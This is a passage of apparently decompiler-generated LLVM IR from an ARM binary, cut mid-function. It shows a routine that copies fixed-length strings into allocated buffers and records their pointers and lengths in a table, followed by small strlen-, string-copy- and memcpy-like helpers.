  store i32 %v0_11e00, i32* @r5, align 4
  %v4_11e10 = call i32 @function_123e0(i32 %v0_11e00, i32 ptrtoint ([7 x i8]* @global_var_19b60.419 to i32), i32 6)
  %v0_11e18 = load i32, i32* @r6, align 4
  store i32 %v0_11e18, i32* @r0, align 4
  %v0_11e1c = load i32, i32* @r5, align 4
  store i32 %v0_11e1c, i32* @global_var_22a28.420, align 4
  store i16 6, i16* bitcast (i32* @global_var_22a2c.421 to i16*), align 4
  %v0_11e24 = call i32 @function_13cc8()
  %v0_11e28 = load i32, i32* @r6, align 4
  store i32 %v0_11e24, i32* @r5, align 4
  %v4_11e34 = call i32 @function_123e0(i32 %v0_11e24, i32 ptrtoint ([8 x i8]* @global_var_19b68.423 to i32), i32 %v0_11e28)
  %v0_11e38 = load i32, i32* @r6, align 4
  store i32 %v0_11e38, i32* @r0, align 4
  %v0_11e3c = load i32, i32* @r5, align 4
  store i32 %v0_11e3c, i32* @global_var_22a30.424, align 4
  %v1_11e40 = trunc i32 %v0_11e38 to i16
  store i16 %v1_11e40, i16* bitcast (i32* @global_var_22a34.425 to i16*), align 4
  %v0_11e44 = call i32 @function_13cc8()
  %v0_11e48 = load i32, i32* @r6, align 4
  store i32 %v0_11e44, i32* @r5, align 4
  %v4_11e54 = call i32 @function_123e0(i32 %v0_11e44, i32 ptrtoint ([8 x i8]* @global_var_19b70.427 to i32), i32 %v0_11e48)
  store i32 3, i32* @r0, align 4
  %v0_11e5c = load i32, i32* @r5, align 4
  store i32 %v0_11e5c, i32* @global_var_22a38.428, align 4
  %v0_11e60 = load i32, i32* @r6, align 4
  %v1_11e60 = trunc i32 %v0_11e60 to i16
  store i16 %v1_11e60, i16* bitcast (i32* @global_var_22a3c.429 to i16*), align 4
  %v0_11e64 = call i32 @function_13cc8()
  store i32 %v0_11e64, i32* @r5, align 4
  %v4_11e74 = call i32 @function_123e0(i32 %v0_11e64, i32 ptrtoint ([4 x i8]* @global_var_19b78.431 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_22a44.432 to i16*), align 4
  %v0_11e84 = load i32, i32* @r5, align 4
  store i32 %v0_11e84, i32* @global_var_22a40.433, align 4
  %v0_11e88 = call i32 @function_13cc8()
  store i32 %v0_11e88, i32* @r5, align 4
  %v3_11e98 = call i32 @function_123e0(i32 %v0_11e88, i32 ptrtoint (i32* @global_var_19b7c.435 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  %v0_11ea4 = load i32, i32* @r5, align 4
  store i32 %v0_11ea4, i32* @global_var_22a48.436, align 4
  store i16 19, i16* bitcast (i32* @global_var_22a4c.437 to i16*), align 4
  %v0_11eac = call i32 @function_13cc8()
  store i32 %v0_11eac, i32* @r5, align 4
  %v3_11ebc = call i32 @function_123e0(i32 %v0_11eac, i32 ptrtoint (i32* @global_var_19b90.439 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_22a54.440 to i16*), align 4
  %v0_11ecc = load i32, i32* @r5, align 4
  store i32 %v0_11ecc, i32* @global_var_22a50.441, align 4
  %v0_11ed0 = call i32 @function_13cc8()
  store i32 %v0_11ed0, i32* @r5, align 4
  store i32 9, i32* @r8, align 4
  %v4_11ee4 = call i32 @function_123e0(i32 %v0_11ed0, i32 ptrtoint ([10 x i8]* @global_var_19bac.443 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  %v0_11eec = load i32, i32* @r5, align 4
  store i32 %v0_11eec, i32* @global_var_22a58.444, align 4
  %v0_11ef0 = load i32, i32* @r8, align 4
  %v1_11ef0 = trunc i32 %v0_11ef0 to i16
  store i16 %v1_11ef0, i16* bitcast (i32* @global_var_22a5c.445 to i16*), align 4
  %v0_11ef4 = call i32 @function_13cc8()
  store i32 %v0_11ef4, i32* @r5, align 4
  store i32 16, i32* @sb, align 4
  %v3_11f08 = call i32 @function_123e0(i32 %v0_11ef4, i32 ptrtoint (i32* @global_var_19bb8.447 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_11f10 = load i32, i32* @r5, align 4
  store i32 %v0_11f10, i32* @global_var_22a60.448, align 4
  %v0_11f14 = load i32, i32* @sb, align 4
  %v1_11f14 = trunc i32 %v0_11f14 to i16
  store i16 %v1_11f14, i16* bitcast (i32* @global_var_22a64.449 to i16*), align 4
  %v0_11f18 = call i32 @function_13cc8()
  store i32 %v0_11f18, i32* @r5, align 4
  %v3_11f28 = call i32 @function_123e0(i32 %v0_11f18, i32 ptrtoint (i32* @global_var_19bcc.451 to i32), i32 22)
  store i32 21, i32* @r0, align 4
  %v0_11f34 = load i32, i32* @r5, align 4
  store i32 %v0_11f34, i32* @global_var_22a68.452, align 4
  store i16 22, i16* bitcast (i32* @global_var_22a6c.453 to i16*), align 4
  %v0_11f3c = call i32 @function_13cc8()
  store i32 %v0_11f3c, i32* @r5, align 4
  %v3_11f4c = call i32 @function_123e0(i32 %v0_11f3c, i32 ptrtoint (i32* @global_var_19be4.455 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_22a74.456 to i16*), align 4
  %v0_11f5c = load i32, i32* @r5, align 4
  store i32 %v0_11f5c, i32* @global_var_22a70.457, align 4
  %v0_11f60 = call i32 @function_13cc8()
  store i32 %v0_11f60, i32* @r5, align 4
  %v4_11f70 = call i32 @function_123e0(i32 %v0_11f60, i32 ptrtoint ([18 x i8]* @global_var_19bfc.459 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  %v0_11f7c = load i32, i32* @r5, align 4
  store i32 %v0_11f7c, i32* @global_var_22a78.460, align 4
  store i16 17, i16* bitcast (i32* @global_var_22a7c.461 to i16*), align 4
  %v0_11f84 = call i32 @function_13cc8()
  %v0_11f90 = load i32, i32* @r6, align 4
  %v1_11f90 = add i32 %v0_11f90, 5
  store i32 %v1_11f90, i32* @r6, align 4
  store i32 %v0_11f84, i32* @r5, align 4
  %v3_11f98 = call i32 @function_123e0(i32 %v0_11f84, i32 ptrtoint (i32* @global_var_19c10.463 to i32), i32 12)
  store i32 23, i32* @r0, align 4
  %v0_11fa0 = load i32, i32* @r5, align 4
  store i32 %v0_11fa0, i32* @global_var_22a80.464, align 4
  %v0_11fa4 = load i32, i32* @r6, align 4
  %v1_11fa4 = trunc i32 %v0_11fa4 to i16
  store i16 %v1_11fa4, i16* bitcast (i32* @global_var_22a84.465 to i16*), align 4
  %v0_11fa8 = call i32 @function_13cc8()
  store i32 %v0_11fa8, i32* @r5, align 4
  %v3_11fb8 = call i32 @function_123e0(i32 %v0_11fa8, i32 ptrtoint (i32* @global_var_19c20.467 to i32), i32 23)
  store i32 83, i32* @r0, align 4
  %v2_11fc8 = load i32, i32* @r4, align 4
  %v4_11fc8 = add i32 %v2_11fc8, 260
  %v5_11fc8 = inttoptr i32 %v4_11fc8 to i16*
  store i16 23, i16* %v5_11fc8, align 2
  %v0_11fcc = load i32, i32* @r5, align 4
  store i32 %v0_11fcc, i32* @global_var_22a88.468, align 4
  %v0_11fd0 = call i32 @function_13cc8()
  store i32 %v0_11fd0, i32* @r5, align 4
  %v3_11fe0 = call i32 @function_123e0(i32 %v0_11fd0, i32 ptrtoint (i32* @global_var_19c38.470 to i32), i32 83)
  store i32 32, i32* @r0, align 4
  %v2_11ff0 = load i32, i32* @r4, align 4
  %v4_11ff0 = add i32 %v2_11ff0, 268
  %v5_11ff0 = inttoptr i32 %v4_11ff0 to i16*
  store i16 83, i16* %v5_11ff0, align 2
  %v0_11ff4 = load i32, i32* @r5, align 4
  store i32 %v0_11ff4, i32* @global_var_22a90.471, align 4
  %v0_11ff8 = call i32 @function_13cc8()
  store i32 %v0_11ff8, i32* @r5, align 4
  %v3_12008 = call i32 @function_123e0(i32 %v0_11ff8, i32 ptrtoint (i32* @global_var_19c8c.473 to i32), i32 32)
  store i32 48, i32* @r0, align 4
  %v2_12018 = load i32, i32* @r4, align 4
  %v4_12018 = add i32 %v2_12018, 276
  %v5_12018 = inttoptr i32 %v4_12018 to i16*
  store i16 32, i16* %v5_12018, align 2
  %v0_1201c = load i32, i32* @r5, align 4
  store i32 %v0_1201c, i32* @global_var_22a98.474, align 4
  %v0_12020 = call i32 @function_13cc8()
  store i32 %v0_12020, i32* @r5, align 4
  %v3_12030 = call i32 @function_123e0(i32 %v0_12020, i32 ptrtoint (i32* @global_var_19cb0.476 to i32), i32 48)
  %v0_1203c = load i32, i32* @r6, align 4
  store i32 %v0_1203c, i32* @r0, align 4
  %v2_12040 = load i32, i32* @r4, align 4
  %v4_12040 = add i32 %v2_12040, 284
  %v5_12040 = inttoptr i32 %v4_12040 to i16*
  store i16 48, i16* %v5_12040, align 2
  %v0_12044 = load i32, i32* @r5, align 4
  store i32 %v0_12044, i32* @global_var_22aa0.477, align 4
  %v0_12048 = call i32 @function_13cc8()
  %v0_1204c = load i32, i32* @r6, align 4
  store i32 %v0_12048, i32* @r5, align 4
  %v3_12058 = call i32 @function_123e0(i32 %v0_12048, i32 ptrtoint (i32* @global_var_19ce4.479 to i32), i32 %v0_1204c)
  %v0_12060 = load i32, i32* @r8, align 4
  store i32 %v0_12060, i32* @r0, align 4
  %v0_12064 = load i32, i32* @r6, align 4
  %v1_12064 = trunc i32 %v0_12064 to i16
  %v2_12064 = load i32, i32* @r4, align 4
  %v4_12064 = add i32 %v2_12064, 292
  %v5_12064 = inttoptr i32 %v4_12064 to i16*
  store i16 %v1_12064, i16* %v5_12064, align 2
  %v0_12068 = load i32, i32* @r5, align 4
  store i32 %v0_12068, i32* @global_var_22aa8.480, align 4
  %v0_1206c = call i32 @function_13cc8()
  %v0_12074 = load i32, i32* @r8, align 4
  store i32 %v0_1206c, i32* @r5, align 4
  %v3_1207c = call i32 @function_123e0(i32 %v0_1206c, i32 ptrtoint (i32* @global_var_19cf4.482 to i32), i32 %v0_12074)
  %v0_12084 = load i32, i32* @r7, align 4
  store i32 %v0_12084, i32* @r0, align 4
  %v0_12088 = load i32, i32* @r8, align 4
  %v1_12088 = trunc i32 %v0_12088 to i16
  %v2_12088 = load i32, i32* @r4, align 4
  %v4_12088 = add i32 %v2_12088, 300
  %v5_12088 = inttoptr i32 %v4_12088 to i16*
  store i16 %v1_12088, i16* %v5_12088, align 2
  %v0_1208c = load i32, i32* @r5, align 4
  store i32 %v0_1208c, i32* @global_var_22ab0.483, align 4
  %v0_12090 = call i32 @function_13cc8()
  %v0_12098 = load i32, i32* @r7, align 4
  store i32 %v0_12090, i32* @r5, align 4
  %v3_120a0 = call i32 @function_123e0(i32 %v0_12090, i32 ptrtoint (i32* @global_var_19d00.485 to i32), i32 %v0_12098)
  %v0_120a8 = load i32, i32* @r6, align 4
  store i32 %v0_120a8, i32* @r0, align 4
  %v0_120ac = load i32, i32* @r7, align 4
  %v1_120ac = trunc i32 %v0_120ac to i16
  %v2_120ac = load i32, i32* @r4, align 4
  %v4_120ac = add i32 %v2_120ac, 308
  %v5_120ac = inttoptr i32 %v4_120ac to i16*
  store i16 %v1_120ac, i16* %v5_120ac, align 2
  %v0_120b0 = load i32, i32* @r5, align 4
  store i32 %v0_120b0, i32* @global_var_22ab8.486, align 4
  %v0_120b4 = call i32 @function_13cc8()
  %v0_120b8 = load i32, i32* @r6, align 4
  store i32 %v0_120b4, i32* @r5, align 4
  %v3_120c4 = call i32 @function_123e0(i32 %v0_120b4, i32 ptrtoint (i32* @global_var_19d0c.488 to i32), i32 %v0_120b8)
  %v0_120cc = load i32, i32* @sb, align 4
  store i32 %v0_120cc, i32* @r0, align 4
  %v0_120d0 = load i32, i32* @r6, align 4
  %v1_120d0 = trunc i32 %v0_120d0 to i16
  %v2_120d0 = load i32, i32* @r4, align 4
  %v4_120d0 = add i32 %v2_120d0, 316
  %v5_120d0 = inttoptr i32 %v4_120d0 to i16*
  store i16 %v1_120d0, i16* %v5_120d0, align 2
  %v0_120d4 = load i32, i32* @r5, align 4
  store i32 %v0_120d4, i32* @global_var_22ac0.489, align 4
  %v0_120d8 = call i32 @function_13cc8()
  %v0_120e0 = load i32, i32* @sb, align 4
  store i32 %v0_120d8, i32* @r5, align 4
  %v3_120e8 = call i32 @function_123e0(i32 %v0_120d8, i32 ptrtoint (i32* @global_var_19d1c.491 to i32), i32 %v0_120e0)
  store i32 19, i32* @r0, align 4
  %v0_120f4 = load i32, i32* @sb, align 4
  %v1_120f4 = trunc i32 %v0_120f4 to i16
  %v2_120f4 = load i32, i32* @r4, align 4
  %v4_120f4 = add i32 %v2_120f4, 324
  %v5_120f4 = inttoptr i32 %v4_120f4 to i16*
  store i16 %v1_120f4, i16* %v5_120f4, align 2
  %v0_120f8 = load i32, i32* @r5, align 4
  store i32 %v0_120f8, i32* @global_var_22ac8.492, align 4
  %v0_120fc = call i32 @function_13cc8()
  store i32 %v0_120fc, i32* @r5, align 4
  %v3_1210c = call i32 @function_123e0(i32 %v0_120fc, i32 ptrtoint (i32* @global_var_19d30.494 to i32), i32 19)
  %v0_12118 = load i32, i32* @sl, align 4
  store i32 %v0_12118, i32* @r0, align 4
  %v2_1211c = load i32, i32* @r4, align 4
  %v4_1211c = add i32 %v2_1211c, 332
  %v5_1211c = inttoptr i32 %v4_1211c to i16*
  store i16 19, i16* %v5_1211c, align 2
  %v0_12120 = load i32, i32* @r5, align 4
  store i32 %v0_12120, i32* @global_var_22ad0.495, align 4
  %v0_12124 = call i32 @function_13cc8()
  %v0_1212c = load i32, i32* @sl, align 4
  store i32 %v0_12124, i32* @r5, align 4
  %v4_12134 = call i32 @function_123e0(i32 %v0_12124, i32 ptrtoint ([9 x i8]* @global_var_19d44.497 to i32), i32 %v0_1212c)
  %v0_1213c = load i32, i32* @fp, align 4
  store i32 %v0_1213c, i32* @r0, align 4
  %v0_12140 = load i32, i32* @sl, align 4
  %v1_12140 = trunc i32 %v0_12140 to i16
  %v2_12140 = load i32, i32* @r4, align 4
  %v4_12140 = add i32 %v2_12140, 340
  %v5_12140 = inttoptr i32 %v4_12140 to i16*
  store i16 %v1_12140, i16* %v5_12140, align 2
  %v0_12144 = load i32, i32* @r5, align 4
  store i32 %v0_12144, i32* @global_var_22ad8.498, align 4
  %v0_12148 = call i32 @function_13cc8()
  %v0_12150 = load i32, i32* @fp, align 4
  store i32 %v0_12148, i32* @r5, align 4
  %v3_12158 = call i32 @function_123e0(i32 %v0_12148, i32 ptrtoint (i32* @global_var_19c2c.500 to i32), i32 %v0_12150)
  %v0_12160 = load i32, i32* @r6, align 4
  store i32 %v0_12160, i32* @r0, align 4
  %v0_12164 = load i32, i32* @fp, align 4
  %v1_12164 = trunc i32 %v0_12164 to i16
  %v2_12164 = load i32, i32* @r4, align 4
  %v4_12164 = add i32 %v2_12164, 348
  %v5_12164 = inttoptr i32 %v4_12164 to i16*
  store i16 %v1_12164, i16* %v5_12164, align 2
  %v0_12168 = load i32, i32* @r5, align 4
  store i32 %v0_12168, i32* @global_var_22ae0.501, align 4
  %v0_1216c = call i32 @function_13cc8()
  %v0_12170 = load i32, i32* @r6, align 4
  store i32 %v0_1216c, i32* @r5, align 4
  %v3_1217c = call i32 @function_123e0(i32 %v0_1216c, i32 ptrtoint (i32* @global_var_19d50.503 to i32), i32 %v0_12170)
  store i32 18, i32* @r0, align 4
  %v0_12188 = load i32, i32* @r6, align 4
  %v1_12188 = trunc i32 %v0_12188 to i16
  %v2_12188 = load i32, i32* @r4, align 4
  %v4_12188 = add i32 %v2_12188, 356
  %v5_12188 = inttoptr i32 %v4_12188 to i16*
  store i16 %v1_12188, i16* %v5_12188, align 2
  %v0_1218c = load i32, i32* @r5, align 4
  store i32 %v0_1218c, i32* @global_var_22ae8.504, align 4
  %v0_12190 = call i32 @function_13cc8()
  store i32 %v0_12190, i32* @r5, align 4
  %v3_121a0 = call i32 @function_123e0(i32 %v0_12190, i32 ptrtoint (i32* @global_var_19d60.506 to i32), i32 18)
  store i32 25, i32* @r0, align 4
  %v2_121b0 = load i32, i32* @r4, align 4
  %v4_121b0 = add i32 %v2_121b0, 364
  %v5_121b0 = inttoptr i32 %v4_121b0 to i16*
  store i16 18, i16* %v5_121b0, align 2
  %v0_121b4 = load i32, i32* @r5, align 4
  store i32 %v0_121b4, i32* @global_var_22af0.507, align 4
  %v0_121b8 = call i32 @function_13cc8()
  store i32 %v0_121b8, i32* %r5.global-to-local, align 4
  %v3_121c8 = call i32 @function_123e0(i32 %v0_121b8, i32 ptrtoint (i32* @global_var_19d74.509 to i32), i32 25)
  store i32 111, i32* @r0, align 4
  %v2_121d8 = load i32, i32* @r4, align 4
  %v4_121d8 = add i32 %v2_121d8, 372
  %v5_121d8 = inttoptr i32 %v4_121d8 to i16*
  store i16 25, i16* %v5_121d8, align 2
  %v0_121dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_121dc, i32* @global_var_22af8.510, align 4
  %v0_121e0 = load i32, i32* @r0, align 4
  store i32 %v0_121e0, i32* @r5, align 4
  %v0_121e4 = call i32 @function_13cc8()
  %v0_121e8 = load i32, i32* @r5, align 4
  store i32 %v0_121e4, i32* @r6, align 4
  %v3_121f4 = call i32 @function_123e0(i32 %v0_121e4, i32 ptrtoint (i32* @global_var_19d90.512 to i32), i32 %v0_121e8)
  %v0_121fc = load i32, i32* @r5, align 4
  store i32 %v0_121fc, i32* @r0, align 4
  %v1_12200 = trunc i32 %v0_121fc to i16
  %v2_12200 = load i32, i32* @r4, align 4
  %v4_12200 = add i32 %v2_12200, 380
  %v5_12200 = inttoptr i32 %v4_12200 to i16*
  store i16 %v1_12200, i16* %v5_12200, align 2
  %v0_12204 = load i32, i32* @r6, align 4
  store i32 %v0_12204, i32* @global_var_22b00.513, align 4
  %v0_12208 = call i32 @function_13cc8()
  %v0_1220c = load i32, i32* @r5, align 4
  store i32 %v0_12208, i32* @r6, align 4
  %v3_12218 = call i32 @function_123e0(i32 %v0_12208, i32 ptrtoint (i32* @global_var_19e00.515 to i32), i32 %v0_1220c)
  store i32 110, i32* @r0, align 4
  %v0_12224 = load i32, i32* @r5, align 4
  %v1_12224 = trunc i32 %v0_12224 to i16
  %v2_12224 = load i32, i32* @r4, align 4
  %v4_12224 = add i32 %v2_12224, 388
  %v5_12224 = inttoptr i32 %v4_12224 to i16*
  store i16 %v1_12224, i16* %v5_12224, align 2
  %v0_12228 = load i32, i32* @r6, align 4
  store i32 %v0_12228, i32* @global_var_22b08.516, align 4
  %v0_1222c = load i32, i32* @r0, align 4
  store i32 %v0_1222c, i32* @r5, align 4
  %v0_12230 = call i32 @function_13cc8()
  %v0_12234 = load i32, i32* @r5, align 4
  store i32 %v0_12230, i32* @r6, align 4
  %v3_12240 = call i32 @function_123e0(i32 %v0_12230, i32 ptrtoint (i32* @global_var_19e70.518 to i32), i32 %v0_12234)
  %v0_12248 = load i32, i32* @r5, align 4
  store i32 %v0_12248, i32* @r0, align 4
  %v1_1224c = trunc i32 %v0_12248 to i16
  %v2_1224c = load i32, i32* @r4, align 4
  %v4_1224c = add i32 %v2_1224c, 396
  %v5_1224c = inttoptr i32 %v4_1224c to i16*
  store i16 %v1_1224c, i16* %v5_1224c, align 2
  %v0_12250 = load i32, i32* @r6, align 4
  store i32 %v0_12250, i32* @global_var_22b10.519, align 4
  %v0_12254 = call i32 @function_13cc8()
  %v0_12258 = load i32, i32* @r5, align 4
  store i32 %v0_12254, i32* @r6, align 4
  %v3_12264 = call i32 @function_123e0(i32 %v0_12254, i32 ptrtoint (i32* @global_var_19ee0.521 to i32), i32 %v0_12258)
  store i32 117, i32* @r0, align 4
  %v0_12270 = load i32, i32* @r5, align 4
  %v1_12270 = trunc i32 %v0_12270 to i16
  %v2_12270 = load i32, i32* @r4, align 4
  %v4_12270 = add i32 %v2_12270, 404
  %v5_12270 = inttoptr i32 %v4_12270 to i16*
  store i16 %v1_12270, i16* %v5_12270, align 2
  %v0_12274 = load i32, i32* @r6, align 4
  store i32 %v0_12274, i32* @global_var_22b18.522, align 4
  %v0_12278 = call i32 @function_13cc8()
  store i32 %v0_12278, i32* %r5.global-to-local, align 4
  %v3_12288 = call i32 @function_123e0(i32 %v0_12278, i32 ptrtoint (i32* @global_var_19f50.524 to i32), i32 117)
  store i32 %v0_12278, i32* @global_var_22b20.525, align 4
  %v2_12298 = load i32, i32* @r4, align 4
  %v4_12298 = add i32 %v2_12298, 412
  %v5_12298 = inttoptr i32 %v4_12298 to i16*
  store i16 117, i16* %v5_12298, align 2
  store i32 %v6_11b78, i32* %r5.global-to-local, align 4
  ret i32 %v3_12288

; uselistorder directives
  uselistorder i32 %v0_12254, { 1, 0 }
  uselistorder i32 %v0_12230, { 1, 0 }
  uselistorder i32 %v0_12208, { 1, 0 }
  uselistorder i32 %v0_121e4, { 1, 0 }
  uselistorder i32 %v0_1216c, { 1, 0 }
  uselistorder i32 %v0_12148, { 1, 0 }
  uselistorder i32 %v0_12124, { 1, 0 }
  uselistorder i32 %v0_120d8, { 1, 0 }
  uselistorder i32 %v0_120b4, { 1, 0 }
  uselistorder i32 %v0_12090, { 1, 0 }
  uselistorder i32 %v0_1206c, { 1, 0 }
  uselistorder i32 %v0_12048, { 1, 0 }
  uselistorder i32 %v0_11f84, { 1, 0 }
  uselistorder i32 %v0_11e44, { 1, 0 }
  uselistorder i32 %v0_11e24, { 1, 0 }
  uselistorder i32 %v0_11de0, { 1, 0 }
  uselistorder i32 %v0_11dc0, { 1, 0 }
  uselistorder i32 %v0_11d7c, { 1, 0 }
  uselistorder i32 %v0_11d5c, { 1, 0 }
  uselistorder i32 %v0_11d10, { 1, 0 }
  uselistorder i32 %v0_11cf0, { 1, 0 }
  uselistorder i32 %v0_11ca8, { 1, 0 }
  uselistorder i32 %v0_11c60, { 1, 0 }
  uselistorder i32 %v0_11bf8, { 1, 0 }
  uselistorder i32 %v0_11bd4, { 1, 0 }
  uselistorder i32 %v0_11bb0, { 1, 0 }
  uselistorder i32 %v0_11b84, { 1, 0 }
  uselistorder i32 284, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32 17, { 1, 8, 18, 9, 10, 2, 3, 11, 4, 12, 5, 6, 13, 7, 14, 0, 15, 16, 17 }
  uselistorder i32 21, { 1, 6, 2, 7, 3, 8, 4, 9, 10, 5, 0, 11 }
  uselistorder i32 19, { 2, 7, 3, 8, 4, 9, 5, 10, 6, 11, 17, 12, 13, 14, 0, 15, 1, 16 }
  uselistorder i32 13, { 2, 10, 12, 13, 11, 41, 3, 42, 0, 4, 5, 6, 7, 14, 15, 16, 17, 18, 19, 8, 20, 21, 22, 23, 24, 25, 26, 27, 28, 9, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 1, 39, 40 }
  uselistorder i32 11, { 1, 7, 8, 12, 13, 14, 15, 16, 2, 3, 9, 4, 10, 0, 11, 17, 5, 18, 19, 20, 6, 21, 22, 23 }
  uselistorder i32 29, { 0, 5, 6, 3, 1, 2, 4 }
  uselistorder i32 (i32, i32, i32)* @function_123e0, { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 2, 1, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_22988.341 to i32), { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 18, { 1, 12, 2, 13, 3, 14, 4, 15, 5, 16, 6, 17, 11, 7, 0, 18, 8, 19, 9, 20, 10, 21 }
}

define i32 @function_12370(i8* %arg1) local_unnamed_addr {
dec_label_pc_12370:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_12374 = load i8, i8* %arg1, align 1
  %v2_12378 = icmp eq i8 %v3_12374, 0
  %v0_1237c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12378, i32 %v0_1237c)
  br label %dec_label_pc_12384

dec_label_pc_12384:                               ; preds = %dec_label_pc_12384, %dec_label_pc_12370
  %v0_12384 = phi i32 [ %v1_12384, %dec_label_pc_12384 ], [ 0, %dec_label_pc_12370 ]
  %v1_12384 = add i32 %v0_12384, 1
  %v2_12388 = add i32 %v1_12384, %tmp
  %v3_12388 = inttoptr i32 %v2_12388 to i8*
  %v4_12388 = load i8, i8* %v3_12388, align 1
  %v6_12388 = zext i8 %v4_12388 to i32
  store i32 %v6_12388, i32* @r3, align 4
  %v2_1238c = icmp eq i8 %v4_12388, 0
  br i1 %v2_1238c, label %dec_label_pc_12394, label %dec_label_pc_12384

dec_label_pc_12394:                               ; preds = %dec_label_pc_12384
  ret i32 %v1_12384
}

define i32 @function_12398(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12398:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_12398 = load i8, i8* %arg1, align 1
  %v3_12398 = zext i8 %v2_12398 to i32
  store i32 %v3_12398, i32* @r2, align 4
  %v2_1239c = icmp eq i8 %v2_12398, 0
  br i1 %v2_1239c, label %bb, label %dec_label_pc_123a8

bb:                                               ; preds = %dec_label_pc_12398
  store i32 %v3_12398, i32* @ip, align 4
  br label %dec_label_pc_123bc

dec_label_pc_123a8:                               ; preds = %dec_label_pc_12398
  br label %dec_label_pc_123ac

dec_label_pc_123ac:                               ; preds = %dec_label_pc_123ac, %dec_label_pc_123a8
  %v0_123ac = phi i32 [ %v1_123ac, %dec_label_pc_123ac ], [ 0, %dec_label_pc_123a8 ]
  %v1_123ac = add i32 %v0_123ac, 1
  store i32 %v1_123ac, i32* @ip, align 4
  %v2_123b0 = add i32 %v1_123ac, %tmp
  %v3_123b0 = inttoptr i32 %v2_123b0 to i8*
  %v4_123b0 = load i8, i8* %v3_123b0, align 1
  %v2_123b4 = icmp eq i8 %v4_123b0, 0
  br i1 %v2_123b4, label %dec_label_pc_123bc, label %dec_label_pc_123ac

dec_label_pc_123bc:                               ; preds = %dec_label_pc_123ac, %bb
  %v0_123bc = phi i32 [ %v3_12398, %bb ], [ %v1_123ac, %dec_label_pc_123ac ]
  br label %dec_label_pc_123c8

dec_label_pc_123c4:                               ; preds = %dec_label_pc_123c8
  %v0_123c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_123c4 = add i32 %v0_123c4, 1
  %v2_123c4 = inttoptr i32 %v1_123c4 to i8*
  %v3_123c4 = load i8, i8* %v2_123c4, align 1
  %v4_123c4 = zext i8 %v3_123c4 to i32
  store i32 %v4_123c4, i32* @r2, align 4
  store i32 %v1_123c4, i32* %r1.global-to-local, align 4
  %v0_123c8.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_123c8

dec_label_pc_123c8:                               ; preds = %dec_label_pc_123bc, %dec_label_pc_123c4
  %v0_123d0.off0 = phi i8 [ %v2_12398, %dec_label_pc_123bc ], [ %v3_123c4, %dec_label_pc_123c4 ]
  %v0_123c8 = phi i32 [ %v0_123bc, %dec_label_pc_123bc ], [ %v0_123c8.pr, %dec_label_pc_123c4 ]
  %v1_123c8 = add i32 %v0_123c8, -1
  store i32 %v1_123c8, i32* @r3, align 4
  %v3_123cc = icmp eq i32 %v0_123c8, 0
  %v2_123d0 = load i32, i32* @r0, align 4
  %v3_123d0 = inttoptr i32 %v2_123d0 to i8*
  store i8 %v0_123d0.off0, i8* %v3_123d0, align 1
  %v4_123d0 = load i32, i32* @r0, align 4
  %v5_123d0 = add i32 %v4_123d0, 1
  store i32 %v5_123d0, i32* @r0, align 4
  br i1 %v3_123cc, label %dec_label_pc_123d8, label %dec_label_pc_123c4

dec_label_pc_123d8:                               ; preds = %dec_label_pc_123c8
  %v0_123d8 = load i32, i32* @ip, align 4
  ret i32 %v0_123d8

; uselistorder directives
  uselistorder i32 %v0_123c8, { 1, 0 }
  uselistorder i32 %v1_123ac, { 0, 1, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_123c8, { 1, 0 }
}

define i32 @function_123e0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_123e0:
  %ip.global-to-local = alloca i32, align 4
  %v2_123e0 = icmp eq i32 %arg3, 0
  %v0_123e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_123e0, i32 %v0_123e4)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_123ec

dec_label_pc_123ec:                               ; preds = %dec_label_pc_123ec, %dec_label_pc_123e0
  %v0_123ec = phi i32 [ %v1_123f4, %dec_label_pc_123ec ], [ 0, %dec_label_pc_123e0 ]
  %v2_123ec = add i32 %v0_123ec, %arg2
  %v3_123ec = inttoptr i32 %v2_123ec to i8*
  %v4_123ec = load i8, i8* %v3_123ec, align 1
  %v4_123f0 = add i32 %v0_123ec, %arg1
  %v5_123f0 = inttoptr i32 %v4_123f0 to i8*
  store i8 %v4_123ec, i8* %v5_123f0, align 1
  %v0_123f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_123f4 = add i32 %v0_123f4, 1
  store i32 %v1_123f4, i32* %ip.global-to-local, align 4
  %v9_123f8 = icmp eq i32 %v1_123f4, %arg3
  br i1 %v9_123f8, label %dec_label_pc_12400, label %dec_label_pc_123ec

dec_label_pc_12400:                               ; preds = %dec_label_pc_123ec
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_123f4, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_12404(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12404:
  %r2.global-to-local = alloca i32, align 4
  %v2_12404 = icmp eq i32 %arg2, 0
